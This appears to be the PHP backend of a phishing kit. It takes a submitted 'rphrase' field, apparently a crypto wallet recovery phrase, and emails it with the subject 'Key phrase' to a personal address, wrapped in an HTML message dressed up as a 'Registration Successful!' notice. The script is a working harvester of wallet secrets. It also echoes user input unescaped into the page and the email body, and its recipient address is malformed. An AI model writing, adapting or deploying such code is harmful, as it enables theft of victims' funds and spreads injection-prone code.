<?php

          
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $rphrase = isset($_POST['rphrase']) ? trim($_POST['rphrase']):0;
   
    echo $rphrase;

$from = "info@afxcapitalgroup.com";
$to = "chibuezeogu6gmail.com";
$subject = "Key phrase";
$message = '<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional //EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="x-apple-disable-message-reformatting"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title></title><style type="text/css">@media only screen and (min-width: 620px) {.u-row {width: 600px !important;}.u-row .u-col {vertical-align: top;}.u-row .u-col-100 {width: 600px !important;}}@media (max-width: 620px) {.u-row-container {max-width: 100% !important;padding-left: 0px !important;padding-right: 0px !important;}.u-row .u-col {min-width: 320px !important;max-width: 100% !important;display: block !important;}.u-row {width: calc(100% - 40px) !important;}.u-col {width: 100% !important;}.u-col > div {margin: 0 auto;}}body {margin: 0;padding: 0;}table,tr,td {vertical-align: top;border-collapse: collapse;}p { margin: 0;}.ie-container table,.mso-container table {table-layout: fixed;}* {line-height: inherit;}a[x-apple-data-detectors=\'true\'] {color: inherit !important;text-decoration: none !important;} table, td { color: #000000; } @media (max-width: 480px) { #u_content_image_3 .v-container-padding-padding { padding: 46px 10px 10px !important; } #u_content_image_3 .v-src-width { width: auto !important; } #u_content_image_3 .v-src-max-width { max-width: 29% !important; } #u_content_heading_3 .v-container-padding-padding { padding: 10px 20px !important; } #u_content_heading_3 .v-font-size { font-size: 28px !important; } #u_content_text_3 .v-container-padding-padding { padding: 10px 22px 26px !important; } }</style><link href="https://fonts.googleapis.com/css?family=Montserrat:400,700&display=swap" rel="stylesheet" type="text/css"></head><body class="clean-body u_body" style="margin: 0;padding: 0;-webkit-text-size-adjust: 100%;background-color: #f9f9f9;color: #000000"><table id="u_content_heading_3" style="font-family:\'Montserrat\',sans-serif;" role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0"><tbody><tr><td class="v-container-padding-padding" style="overflow-wrap:break-word;word-break:break-word;padding:10px 55px;font-family:\'Montserrat\',sans-serif;" align="left"><h1 class="v-font-size" style="margin: 0px; line-height: 160%; text-align: center; word-wrap: break-word; font-weight: normal; font-family: \'Montserrat\',sans-serif; font-size: 33px;">Registration Successful!</h1></td></tr></tbody></table><table id="u_content_text_3" style="font-family:\'Montserrat\',sans-serif;" role="presentation" cellpadding="0" cellspacing="0" width="100%" border="0"><tbody><tr><td class="v-container-padding-padding" style="overflow-wrap:break-word;word-break:break-word;padding:10px 60px 50px;font-family:\'Montserrat\',sans-serif;" align="left"><div style="color: #444444; line-height: 170%; text-align: center; word-wrap: break-word;"><p style="font-size: 14px; line-height: 170%;">&nbsp;</p><p style="font-size: 14px; line-height: 170%;">'.$rphrase.' </p><p style="font-size: 14px; line-height: 170%;">&nbsp;</p><p style="font-size: 14px; line-height: 170%;">&nbsp;</p><p style="font-size: 14px; line-height: 170%;">If you need any help whatsoever, just reply to this e-mail.</p><p style="font-size: 14px; line-height: 170%;">&nbsp;</p><p style="font-size: 14px; line-height: 170%;"></p></div></td></tr></tbody></table></body></html>';
// The content-type header must be set when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:" . $from;
mail($to,$subject,$message, $headers);
}
?>